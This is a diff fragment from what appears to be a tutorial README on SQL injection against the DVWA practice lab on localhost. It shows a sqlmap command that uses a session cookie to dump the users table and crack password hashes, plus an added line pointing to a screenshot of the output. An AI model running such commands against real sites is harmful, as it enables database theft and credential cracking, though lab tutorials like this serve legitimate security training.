@@ -60,3 +60,8 @@ if u need to see the table content and crack the password hashes using this coma
 ``` 
 sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --dump -T users --batch
 ```
+* in the last u will get output like this 
+
+<imp src ="./PNGs/3.png">
+
+
